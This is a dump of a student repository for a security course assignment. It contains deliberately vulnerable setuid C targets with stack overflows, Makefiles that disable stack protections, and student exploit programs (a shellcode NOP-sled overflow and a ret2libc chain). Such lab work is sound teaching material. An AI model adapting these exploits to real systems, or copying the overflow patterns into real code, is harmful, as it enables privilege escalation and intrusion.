  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/main

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
Initial commit of project files

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
5eef708ef223be75f74e68d36cedffcf5484f284

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/remotes/origin/main>
<START OF ./repo.txt>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
